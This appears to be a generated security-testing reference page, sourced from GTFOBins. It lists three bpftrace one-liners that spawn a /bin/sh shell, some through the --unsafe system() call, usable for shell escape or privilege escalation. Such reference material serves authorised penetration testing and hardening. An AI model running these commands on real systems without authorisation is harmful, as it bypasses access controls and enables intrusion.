---
parsed_by: focuslocust
source: commands
type: generated
---
# bpftrace Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## bpftrace

Tool page: [bpftrace](../../tools/linux/bpftrace.md)

### shell

```text
bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bpftrace` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
bpftrace --unsafe /path/to/temp-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bpftrace` |
| Evidence | Function example preserved from source parser. |

### shell

```text
bpftrace -c /bin/sh -e 'END {exit()}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bpftrace` |
| Evidence | Function example preserved from source parser. |
